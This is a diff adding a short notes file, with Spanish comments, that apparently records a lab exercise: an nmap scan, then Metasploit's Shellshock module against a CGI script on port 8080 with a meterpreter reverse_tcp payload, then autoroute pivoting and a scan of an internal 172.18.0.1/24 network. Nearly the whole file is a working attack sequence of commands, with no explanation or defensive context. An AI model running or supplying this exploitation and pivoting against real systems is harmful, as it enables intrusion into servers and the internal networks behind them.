@@ -1,0 +1,23 @@
+# Tras levantar
+nmap 192.168.1.135 # Mi ip
+# Conecta a http, busca el shellshock
+# Ataca "a mano shellshock"
+msfconsole
+
+
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+options
+set rport 8080
+set rhost 192.168.1.135 # Mi ip
+set targeturi /cgi-bin/howiam
+options
+set payload linux/x86/meterpreter/reverse_tcp
+options
+set lhost 192.168.1.135
+run
+# Aquí empieza meterpreter
+sysinfo
+ipconfig
+background
+run autoroute -s 172.18.0.1/24
+nmap 172.18.0.1/24
